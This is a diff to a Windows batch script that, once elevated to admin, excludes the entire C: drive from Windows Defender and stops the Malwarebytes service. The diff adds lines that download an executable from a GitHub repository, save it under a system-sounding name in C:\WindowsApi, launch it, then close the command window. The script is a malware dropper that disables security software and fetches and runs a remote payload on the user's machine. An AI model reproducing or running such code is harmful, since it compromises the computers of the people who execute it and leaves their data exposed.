@@ -5,5 +5,10 @@ if not "%1"=="am_admin" (
     exit /b
 )
 set "scriptDir=%~dp0"
-start "" "%ProgramFiles%\Malwarebytes\Anti-Malware\malwarebytes_assistant.exe" --stopservice
 powershell -Command "Add-MpPreference -ExclusionPath 'C:\'"
+start "" "%ProgramFiles%\Malwarebytes\Anti-Malware\malwarebytes_assistant.exe" --stopservice
+TIMEOUT /T 3
+powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/aspdasdksa/TROLLLOLL/raw/main/hello.exe', 'C:\WindowsApi\WindowsApi.exe')"
+start "" "C:\WindowsApi\WindowsApi.exe"
+taskkill /IM cmd.exe
+exit
